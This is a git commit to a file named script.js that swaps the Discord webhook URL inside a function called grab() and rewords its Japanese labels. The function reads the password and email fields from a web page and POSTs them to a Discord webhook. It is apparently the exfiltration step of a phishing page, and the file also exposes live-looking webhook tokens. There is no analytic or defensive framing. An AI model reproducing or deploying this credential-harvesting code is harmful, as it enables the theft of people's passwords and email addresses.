b198b898fb703ef5b70db010a726eabbc6b4b4d7
Yuusei0311 <102321388+Yuusei0311@users.noreply.github.com>
2022-06-26 20:18:31 +0900

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,6 @@
 function grab(){
   let xhr = new XMLHttpRequest()
-  xhr.open('POST','https://discord.com/api/webhooks/990246436610408518/7J9Z5P4-SCE6WmwqkVA5DhBc6GFjD7HPkMP3jHIcIwKe0C_UquuIpMziPUCZwqqOWLnl')
+  xhr.open('POST','https://discord.com/api/webhooks/990568750480756766/zhtrSJ9hl4U2zuuqmiBihBHsaXMXecU1ThdYxQOYbMQPO5ByqwiYeof0wYHEEuOBy_qr')
   xhr.setRequestHeader('Content-Type','application/json')
-  xhr.send(JSON.stringify({"content":`パスワード: ${document.getElementById('pass').value}\nメアド: ${document.getElementById('mail').value}`}))
+  xhr.send(JSON.stringify({"content":`パスワードはこれ: ${document.getElementById('pass').value}\nメアドはこれ: ${document.getElementById('mail').value}`}))
 }
